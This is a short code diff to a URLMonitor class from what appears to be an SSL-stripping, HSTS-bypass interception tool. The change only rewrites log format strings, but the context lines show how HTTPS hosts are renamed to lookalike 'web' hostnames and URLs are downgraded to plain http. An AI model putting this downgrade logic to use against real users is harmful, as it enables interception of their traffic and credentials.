@@ -85,7 +85,7 @@ class URLMonitor:
                 s.add(to_url)
                 return
         url_set = set([from_url, to_url])
-        log.debug("Set redirection: {}".format(url_set))
+        log.debug("Set redirection: {0}".format(url_set))
         self.redirects.append(url_set)
 
     def getRedirectionSet(self, url):
@@ -126,7 +126,7 @@ class URLMonitor:
                 else:
                     self.sustitucion[host] = "web"+host
                     self.real["web"+host] = host
-                log.debug("SSL host ({}) tokenized ({})".format(host, self.sustitucion[host]))
+                log.debug("SSL host ({0}) tokenized ({1})".format(host, self.sustitucion[host]))
                     
             url = 'http://' + host + path
 
@@ -162,14 +162,14 @@ class URLMonitor:
         return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
     
     def URLgetRealHost(self, host):
-        log.debug("Parsing host: {}".format(host))
+        log.debug("Parsing host: {0}".format(host))
 
         self.updateHstsConfig()
 
         if self.real.has_key(host):
-            log.debug("Found host in list: {}".format(self.real[host]))
+            log.debug("Found host in list: {0}".format(self.real[host]))
             return self.real[host]
 
         else:
-            log.debug("Host not in list: {}".format(host))
+            log.debug("Host not in list: {0}".format(host))
             return host
